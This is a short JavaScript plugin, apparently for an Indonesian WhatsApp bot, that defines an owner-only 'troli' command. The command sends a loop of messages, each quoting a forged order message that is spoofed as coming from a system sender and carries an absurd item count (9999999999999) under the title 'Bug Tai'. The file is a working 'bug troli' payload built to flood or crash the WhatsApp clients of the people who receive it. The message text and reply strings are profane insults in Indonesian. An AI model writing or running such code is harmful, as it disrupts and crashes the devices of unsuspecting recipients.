let handler = async (m, { conn, args, text, isPrems, isOwner }) => {
if (!isOwner) return m.reply('huuu kontol,mau nya bug troli')
for (let i = 0; i < args[0]; i++) {
conn.sendMessage(m.chat, `jancok`, m.mtype,{
 quoted: {
key: {
participant: `0@s.whatsapp.net`, ...(m.chat ? { remoteJid: "status@broadcast" } : {})
},
message: {
orderMessage: {
itemCount: 9999999999999,
status: 1,
surface: 10,
orderTitle: 'Bug Tai',
sellerJid: '0@s.whatsapp.net'
}}}}, 0)
}
}

handler.help = ['troli <berapa>?']
handler.tags = ['owner']
handler.customPrefix = /(\?$)/
handler.command = /^troli/i
handler.owner = true
handler.mods = false
handler.premium = false
handler.group = false
handler.private = false

handler.admin = false
handler.botAdmin = false

handler.fail = null

module.exports = handler